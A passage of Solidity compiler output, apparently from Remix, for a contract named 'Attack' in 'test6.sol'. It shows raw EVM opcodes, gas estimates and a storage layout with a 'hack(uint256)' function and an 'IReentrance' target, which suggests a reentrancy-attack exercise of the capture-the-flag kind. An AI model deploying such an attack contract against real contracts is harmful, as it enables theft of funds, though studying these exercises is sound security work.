CALLDATALOAD SWAP1 POP PUSH2 0x1EF DUP2 PUSH2 0x1CB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x20A JUMPI PUSH2 0x209 PUSH2 0x1BE JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x217 DUP5 DUP3 DUP6 ADD PUSH2 0x1E1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH32 0xFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x254 DUP2 PUSH2 0x220 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x26D PUSH0 DUP4 ADD DUP5 PUSH2 0x24B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x29F DUP3 PUSH2 0x273 JUMP JUMPDEST PUSH2 0x2A9 DUP2 DUP6 PUSH2 0x27D JUMP JUMPDEST SWAP4 POP PUSH2 0x2B9 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x287 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x2D0 DUP3 DUP5 PUSH2 0x295 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x5472616E73616374696F6E206661696C65640000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x31F PUSH1 0x12 DUP4 PUSH2 0x2DB JUMP JUMPDEST SWAP2 POP PUSH2 0x32A DUP3 PUSH2 0x2EB JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x34C DUP2 PUSH2 0x313 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ISZERO 0x4C PUSH14 0x19CD8A9D46F07FF57CEB27C160BE 0xF6 DUP4 LOG1 0xE STOP SWAP11 0xB6 0x27 SWAP13 0xDA BLOCKHASH CALLDATACOPY CALLDATASIZE INVALID 0x24 PUSH5 0x736F6C6343 STOP ADDMOD SAR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "181000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"hack(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack(uint256)": "25565cdd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 10,
						"contract": "test6.sol:Attack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IReentrance)7"
					}
				],
				"types": {
					"t_contract(IReentrance)7": {
						"encoding": "inplace",
						"label": "contract IReentrance",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}